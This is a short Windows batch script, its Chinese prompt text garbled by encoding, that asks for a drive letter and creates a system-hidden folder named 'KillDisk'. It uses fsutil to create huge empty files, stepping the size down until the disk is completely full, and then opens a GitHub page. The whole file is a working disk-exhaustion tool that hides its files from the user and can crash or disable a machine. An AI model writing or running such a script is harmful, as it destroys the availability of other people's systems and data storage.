@echo off
title ��������Ӳ��
cls
set file=0
set bigger=10000000000000

:disk
SET/p Disk=�����롾��Ҫ�������Ĵ��̷��������̷���
echo.
set %Disk%=%Disk:~0,1%
IF NOT EXIST "%disk%:\" (goto disk)
md %disk%:\KillDisk
attrib +s +h %disk%:\KillDisk

:start
set /a file=%file%+1
echo �������� %file% ���ļ����ļ���С��%bigger% �ֽ�
fsutil file createnew %disk%:\KillDisk\%file% %bigger%>nul
IF NOT EXIST "%disk%:\KillDisk\%file%" (goto bigger)
goto start

:bigger
if /i "%bigger%"=="1" goto exit
if /i "%bigger%"=="10" set bigger=1
if /i "%bigger%"=="100" set bigger=10
if /i "%bigger%"=="1000" set bigger=100
if /i "%bigger%"=="10000" set bigger=1000
if /i "%bigger%"=="100000" set bigger=10000
if /i "%bigger%"=="1000000" set bigger=100000
if /i "%bigger%"=="10000000" set bigger=1000000
if /i "%bigger%"=="100000000" set bigger=10000000
if /i "%bigger%"=="1000000000" set bigger=100000000
if /i "%bigger%"=="10000000000" set bigger=1000000000
if /i "%bigger%"=="100000000000" set bigger=10000000000
if /i "%bigger%"=="1000000000000" set bigger=100000000000
if /i "%bigger%"=="10000000000000" set bigger=1000000000000
goto start

:exit
cls
echo Ŀ������Ѿ�����ȫ������
echo.
pause
start https://github.com/MOCBear